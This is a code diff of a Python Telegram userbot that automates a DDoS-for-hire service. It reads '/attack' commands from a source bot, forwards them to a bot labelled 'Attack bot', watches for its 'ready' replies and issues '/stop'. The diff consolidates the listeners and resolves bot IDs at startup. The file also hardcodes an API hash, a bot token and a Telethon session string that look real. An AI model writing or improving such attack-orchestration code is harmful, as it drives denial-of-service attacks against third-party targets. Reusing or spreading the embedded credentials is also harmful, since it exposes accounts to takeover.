@@ -10,8 +10,9 @@ API_ID = 36295148
 API_HASH = "bee66be844e3be0e314508e92a7c4e7d"
 BOT_TOKEN = "8473172869:AAG1B8DvV4dwodGudTz11cBed2iq-DDReSY"
 
-BOT_A = "@botbysahilbot"          # IP / CMD source bot
-BOT_B = "@DDOS_Aditya_xd_bot"     # Attack bot
+# usernames without @
+BOT_A_USERNAME = "botbysahilbot"          # IP / CMD source bot
+BOT_B_USERNAME = "DDOS_Aditya_xd_bot"     # Attack bot
 
 STRING_SESSION = (
     "1BVtsOKEBu502_IqKteaXEshN7yLh50dvjgNG7WFdv2SNMNtJOHSxj7RgTF5qUIIMziiQPAG5irsAx37"
@@ -23,8 +24,11 @@ STRING_SESSION = (
 
 tele = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)
 
+BOT_A_ID = None
+BOT_B_ID = None
+
 # per-chat FSM + target
-# state keys: armed, bot_ready, running, current_cmd, pending_cmd, target
+# keys: armed, bot_ready, running, current_cmd, pending_cmd, target
 chat_state: dict[int, dict] = {}
 
 
@@ -50,7 +54,7 @@ async def try_execute(cid: int):
     state["bot_ready"] = False
 
     print(f"[FSM {cid}] START CMD -> {cmd} | target={state['target']}")
-    await tele.send_message(BOT_B, cmd)
+    await tele.send_message(BOT_B_ID, cmd)
 
 
 async def cancel_task(cid: int):
@@ -60,72 +64,82 @@ async def cancel_task(cid: int):
         return
 
     print(f"[FSM {cid}] STOP CMD -> {state['current_cmd']}")
-    await tele.send_message(BOT_B, "/stop")
+    await tele.send_message(BOT_B_ID, "/stop")
 
     state["running"] = False
     state["current_cmd"] = None
 
 
-# --------- TELETHON LISTENERS ----------
-@tele.on(events.NewMessage(from_users=BOT_A))
-async def ip_bot_listener(event):
-    """IP BOT / source se CMD line read + clean karke FSM me daalo."""
-    text = event.text or ""
-    print("📩 IP BOT REPLY:", text)
+# --------- TELETHON LISTENER (single) ----------
+@tele.on(events.NewMessage)
+async def generic_listener(event):
+    """Har new message pe check karo sender BOT_A hai ya BOT_B."""
+    global BOT_A_ID, BOT_B_ID
 
-    # FIX: regex me s
-    m = re.search(r"CMD:s*(.+)", text)
-    if not m:
+    sender = await event.get_sender()
+    if not sender:
         return
 
-    cmd = m.group(1).strip()
-    cmd = cmd.replace("**", "").replace("`", "").strip()
+    sender_id = sender.id
+    text = event.text or ""
 
-    print("✅ FINAL CMD:", cmd)
+    # ---------- BOT A (IP / CMD source) ----------
+    if BOT_A_ID is not None and sender_id == BOT_A_ID:
+        print("📩 IP BOT REPLY:", text)
 
-    for cid, state in chat_state.items():
-        if not state["armed"]:
-            continue
-        if not state["target"]:
-            continue
+        # CMD line — markdown variations handle:
+        # CMD: /attack ...
+        # **CMD:** /attack ...
+        # `CMD:` /attack ...
+        m = re.search(r"CMD[:*s`]*s*(.+)", text, flags=re.IGNORECASE)
+        if not m:
+            return
 
-        if cmd == state["current_cmd"]:
-            print(f"[FSM {cid}] Same CMD running, ignore.")
-            continue
+        cmd = m.group(1).strip()
+        cmd = cmd.replace("**", "").replace("`", "").strip()
 
-        if state["running"]:
-            state["pending_cmd"] = cmd
-            print(f"[FSM {cid}] New CMD while running -> queue + /stop.")
-            await cancel_task(cid)
-        else:
-            state["pending_cmd"] = cmd
-            print(f"[FSM {cid}] Idle -> pending set, try_execute.")
+        print("✅ FINAL CMD:", cmd)
+
+        for cid, state in chat_state.items():
+            if not state["armed"]:
+                continue
+            if not state["target"]:
+                continue
+
+            if cmd == state["current_cmd"]:
+                print(f"[FSM {cid}] Same CMD running, ignore.")
+                continue
+
+            if state["running"]:
+                state["pending_cmd"] = cmd
+                print(f"[FSM {cid}] New CMD while running -> queue + /stop.")
+                await cancel_task(cid)
+            else:
+                state["pending_cmd"] = cmd
+                print(f"[FSM {cid}] Idle -> pending set, try_execute.")
+                await try_execute(cid)
+
+    # ---------- BOT B (DDOS / target) ----------
+    if BOT_B_ID is not None and sender_id == BOT_B_ID:
+        low = text.lower()
+        print("DDOS BOT MSG:", repr(text))
+
+        is_ready = (
+            "✅ **ʀᴇᴀᴅʏ**" in text
+            or "no attack running" in low
+            or "you can start a new attack" in low
+            or "ready" in low
+        )
+
+        if not is_ready:
+            return
+
+        for cid, state in chat_state.items():
+            if not state["armed"]:
+                continue
+
+            state["bot_ready"] = True
             await try_execute(cid)
-
-
-@tele.on(events.NewMessage(from_users=BOT_B))
-async def bot_b_listener(event):
-    """DDOS BOT ke /status ya info se READY detect karo."""
-    text = event.text or ""
-    low = text.lower()
-    print("DDOS BOT MSG:", repr(text))
-
-    is_ready = (
-        "✅ **ʀᴇᴀᴅʏ**" in text
-        or "no attack running" in low
-        or "you can start a new attack" in low
-        or "ready" in low
-    )
-
-    if not is_ready:
-        return
-
-    for cid, state in chat_state.items():
-        if not state["armed"]:
-            continue
-
-        state["bot_ready"] = True
-        await try_execute(cid)
 
 
 # --------- PTB COMMANDS ----------
@@ -192,8 +206,17 @@ async def stop_fsm(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # --------- MAIN ----------
 async def main():
+    global BOT_A_ID, BOT_B_ID
+
     await tele.start()
     print("🧵 Telethon connected")
+
+    # resolve bot entities once by username
+    bot_a = await tele.get_entity(BOT_A_USERNAME)
+    bot_b = await tele.get_entity(BOT_B_USERNAME)
+    BOT_A_ID = bot_a.id
+    BOT_B_ID = bot_b.id
+    print("BOT_A_ID:", BOT_A_ID, "BOT_B_ID:", BOT_B_ID)
 
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("setlinkchatid", setlink))
